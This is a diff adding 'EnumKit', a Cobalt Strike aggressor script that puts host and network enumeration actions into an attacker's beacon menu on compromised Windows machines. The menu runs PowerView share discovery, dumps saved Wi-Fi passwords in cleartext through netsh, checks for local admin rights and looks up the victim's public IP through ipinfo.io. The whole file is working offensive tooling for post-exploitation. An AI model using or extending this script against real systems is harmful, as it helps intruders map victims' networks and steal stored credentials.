@@ -1,0 +1,41 @@
+# Actions in this kit center around host and network enumeration. Credential enumeration actions should go in CredKit instead.
+# @Und3rf10w
+
+popup beacon_bottom {
+	menu "EnumKit" {
+		menu "Windows"{
+			menu "PowerView"{
+				item "List accessible shares"{
+					local('$bid');
+					foreach $bid ($1){
+						binput($1, "powershell-import PowerView.ps1");
+						bpowershell_import($1, script_resource("scripts/PowerView.ps1"));
+						binput($1, "powershell Invoke-ShareFinder -CheckShareAccess");
+						bpowershell($1, "Invoke-ShareFinder -CheckShareAccess");
+					}
+				}
+			}
+			item "List WLAN Profiles"{
+				local('$bid');
+				foreach $bid ($1){
+					binput($1, "shell netsh wlan show profiles name=\"*\" key=clear");
+					bshell($1, "netsh wlan show profiles name=\"*\" key=clear");
+				}
+			}
+			item "Is User Local Admin?"{
+				local('$bid');
+				foreach $bid ($1){
+					binput($1, "powershell Is-UserLocalAdmin");
+					bpowershell($1, "([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")");
+				}
+			}
+			item "ipinfo.io Check"{
+				local('$bid');
+				foreach $bid ($1){
+					binput($1, "powershell (New-Object System.Net.WebClient).DownloadString(\"http://ipinfo.io\")");
+					bpowershell($1, "(New-Object System.Net.WebClient).DownloadString(\"http://ipinfo.io\")");
+				}
+			}
+		}
+	}
+}
